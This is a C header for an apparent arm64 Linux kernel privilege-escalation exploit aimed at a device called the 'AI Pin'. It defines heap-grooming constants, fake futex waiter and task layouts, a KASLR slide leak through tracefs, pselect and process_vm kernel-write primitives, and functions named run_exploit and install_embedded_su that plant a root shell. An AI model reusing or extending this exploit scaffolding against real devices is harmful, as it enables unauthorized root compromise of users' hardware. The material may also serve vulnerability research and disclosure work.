#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"
#include "reclaim_hold.h"

#ifndef TARGET_USE_PSELECT_RESULT_STAMP
#define TARGET_USE_PSELECT_RESULT_STAMP 0
#endif

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE PAGE_SIZE
#define KS_PAGE_MASK (PAGE_SIZE - 1)

#include "kernelsnitch/utils.h"

#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#define SKB_DATA_DELTA (-0xe80LL)

/*
 * proc_caches_init() requests 0x370 bytes for mm_struct.  SLAB_HWCACHE_ALIGN
 * rounds each SLUB slot to 0x380; KernelSnitch must walk the slot stride, not
 * the C object size.
 */
#define MM_STRUCT_OBJECT_SZ 0x370
#define MM_STRUCT_SZ 0x380
#define MM_ORDER 3
#define MM_PREPARE_SLABS_MIN 16
#define MM_PREPARE_SLABS_MAX 64
#define CORE 0
#define KSNITCH_COLLISIONS 6

#define DIRECT_MAP_BASE P0_PAGE_OFFSET
#define KERNELSNITCH_IDENTITY_START DIRECT_MAP_BASE
/*
 * The linear window on VA39 is 256 GB, and the memstart randomization
 * (arm64_memblock_init, seed>>48) can place the RAM anywhere inside it.
 * The window runs from PAGE_OFFSET through UINTPTR_MAX.  Both KernelSnitch
 * candidates and per-CPU allocations must therefore accept any address at
 * or above DIRECT_MAP_BASE; a historic 16 GB upper bound rejected valid
 * per-CPU pointers on randomized boots.
 */
#define KERNELSNITCH_IDENTITY_END (DIRECT_MAP_BASE + (256ULL << 30))

#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FAKE_TASK_OFF 0x3200

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SIZE (ORDER3_SIZE - SKB_DATA_DELTA)
#define SKB_RECLAIM_SENDS 128
#define SKB_PERF_GATE_RECLAIM_SENDS 4096
#define SKB_PERF_GATE_RECLAIM_PAIRS 128
#define SKB_PERF_GATE_POLL_INTERVAL 8
#define SKB_RECLAIM_PAIRS 32
#define SKB_ABSORB_PAIRS 8
#define SKB_ABSORB_SENDS_PER_PAIR 3
#define RECLAIM_ORDER0_PREFILL_MB 8

_Static_assert(SKB_SEND_SIZE == 0x10000,
               "SKB_SEND_SIZE must remain 64 KiB");
_Static_assert(SKB_RECLAIM_SIZE == 0x8e80,
               "unexpected SKB_RECLAIM_SIZE");
_Static_assert(SKB_RECLAIM_SENDS == GHOSTLOCK_RECLAIM_SENDS,
               "reclaim helper send count drift");
_Static_assert(SKB_RECLAIM_PAIRS == GHOSTLOCK_RECLAIM_PAIRS,
               "reclaim helper pair count drift");
_Static_assert(SKB_PERF_GATE_RECLAIM_PAIRS <= GHOSTLOCK_RECLAIM_MAX_PAIRS,
               "perf reclaim pair count exceeds helper capacity");

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 130
#if TARGET_HAS_UCLAMP
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))
#endif

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1
#define DIRECT_FOLLOWUP_ATTEMPTS 10
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_ROUTE_WORDS_PER_SET 5
#define PSELECT_ROUTE_SENTINEL_FD 63
#define PSELECT_ROUTE_HIGH_FD 512
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_ENTER_DELAY_USEC 50000
#define PSELECT_TIMEOUT_SEC 5
#define ROUTE_WAIT_SECONDS 8

#define PROCESS_VM_WAITER_WORDS (TARGET_WAITER_SIZE / sizeof(uint64_t))

struct process_vm_waiter_stamp {
  unsigned char sink;
  struct iovec local;
  struct iovec remote[8];
  pid_t self;
};

struct pselect_waiter_stamp {
  fd_set in;
  fd_set out;
  fd_set ex;
  uint64_t expected[PROCESS_VM_WAITER_WORDS];
  int ready_fd;
  int peer_fd;
  int expected_ret;
  int opened_fds;
};

_Static_assert(MM_STRUCT_OBJECT_SZ == 0x370,
               "unexpected AI Pin mm_struct object size");
_Static_assert(MM_STRUCT_SZ == 0x380,
               "unexpected AI Pin mm_struct SLUB stride");
_Static_assert(PROCESS_VM_WAITER_WORDS == 10,
               "process_vm stamp expects ten waiter qwords");
_Static_assert(PSELECT_ROUTE_NFDS == PSELECT_ROUTE_WORDS_PER_SET * 64,
               "pselect route must use exactly five 64-bit words per set");
_Static_assert(PSELECT_ROUTE_SENTINEL_FD < 64,
               "pselect sentinel must remain before the stale waiter");

/*
 * Linear-map alias correction.  The compile-time P0_DATA_ALIAS_CONST below
 * assumes the image sits at the nominal physical load (P0_KERNEL_PHYS_LOAD)
 * and memstart_addr == P0_PHYS_OFFSET.  On this kernel both assumptions are
 * wrong per boot: the loader loads at P_load (0xa1280000, loader-fixed) and
 * arm64_memblock_init() randomizes memstart_addr down in 1 GB quanta from
 * the top 16 bits of the kaslr-seed.  The true linear alias of an image
 * symbol is:
 *
 *   linear(sym) = P0_PAGE_OFFSET + (P_load - memstart) + (sym - KIMAGE_TEXT_BASE)
 *
 * so the runtime correction over the compile-time constant is
 *
 *   p0_linear_delta = P_load - memstart - P0_KERNEL_PHYS_DELTA
 *
 * (0 disables the correction; measured per boot on the dev unit via the
 * known reclaim-page phys/linear pair, see fleet/leak-math.md section 5).
 */
extern uint64_t p0_linear_delta;
/*
 * Leak modes (env AI_PIN_SLIDE_LEAK):
 * 0 = Spec A: survive-anywhere stamp, no KASLR information.
 * 1 = Spec B: rb-erase redirect through runtime LINEAR aliases
 *     (P0_PAGE_OFFSET + p0_linear_delta + ...).  Needs the per-boot
 *     linear delta to be exactly right; on this kernel memstart is
 *     randomized per boot and unmeasurable unprivileged, so mode 1 is
 *     for delta-calibrated dev runs / kernels without linear
 *     randomization.
 * 2 = Spec B through VIRTUAL (slid) anchors: obtain the slide via the
 *     read-only tracefs wchan leak first, then stamp
 *     kaslr_image_addr(&loggers[0][1]) / (&random_table[5].data).  The
 *     walk, the rb-erase redirect and the boot_id read-back are
 *     identical; only the anchor address space differs, and virtual
 *     kimg .data addresses are memstart-independent.
 */
extern int p0_slide_leak;

int p0_env_init(void);
uintptr_t p0_runtime_alias(uintptr_t image_addr);
int slide_tracefs_leak_kernel_base(void);
int prepare_reclaim_trace_init(void);
void prepare_reclaim_trace_close(void);

#define SLIDE_NFULNL_LOGGER \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 p0_runtime_alias(SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  p0_runtime_alias(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  int *memfds;
};

extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_custom_shape;
extern int direct_root_cpu;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;

extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;

int run_exploit(int argc, char **argv);
int install_embedded_su(pid_t *daemon_pid);
int init_direct_root_cpu(void);
int restore_initial_affinity(void);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void log_slide_child_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);

uintptr_t p0_alias_image_offset(uintptr_t data_alias);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);
uintptr_t pselect_write_value(void);
uintptr_t pselect_write_target(void);
int pselect_write_shape(void);
void set_pselect_write(uintptr_t target, uintptr_t value, int shape);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);

void close_reclaim_sockets(void);
void cleanup_page_prepare_state(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
int process_vm_stamp_waiter(const uint64_t words[PROCESS_VM_WAITER_WORDS]);
void process_vm_prepare_waiter_stamp(
    struct process_vm_waiter_stamp *stamp,
    const uint64_t words[PROCESS_VM_WAITER_WORDS]);
int process_vm_execute_waiter_stamp(
    const struct process_vm_waiter_stamp *stamp);
int pselect_prepare_waiter_stamp(
    struct pselect_waiter_stamp *stamp,
    const uint64_t words[PROCESS_VM_WAITER_WORDS]);
int pselect_execute_waiter_stamp(struct pselect_waiter_stamp *stamp);
int pselect_waiter_stamp_matches(const struct pselect_waiter_stamp *stamp);
int prepare_pselect_fake_lock_route(void);
void do_pselect_fake_lock_route(void);
void reset_main_route_state(void);
void run_main_route_threads(void);

int slide_pselect_words_per_set(void);
int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value);
void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name);
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void open_slide_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
void slide_pselect_stack_copy(void);
int hex_value(char c);
int slide_leak_kernel_base(void);

int is_kernel_ptr(uintptr_t value);
int is_direct_ptr(uintptr_t value);
int direct_pselect_write_once(
    uintptr_t target, uintptr_t value, int shape, int idx);
int direct_pselect_write_followup_once(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx);

#endif
